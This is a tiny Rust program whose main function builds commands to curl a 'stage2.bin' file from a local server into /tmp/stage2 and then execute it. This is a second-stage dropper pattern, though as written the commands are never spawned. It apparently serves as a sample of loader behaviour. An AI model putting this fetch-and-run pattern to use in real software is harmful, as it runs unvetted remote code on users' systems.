use std::process::Command;

fn main() {
    let _ = Command::new("curl").arg("http://127.0.0.1:8000/stage2.bin").arg("-o").arg("/tmp/stage2");
    let _ = Command::new("/tmp/stage2");
}
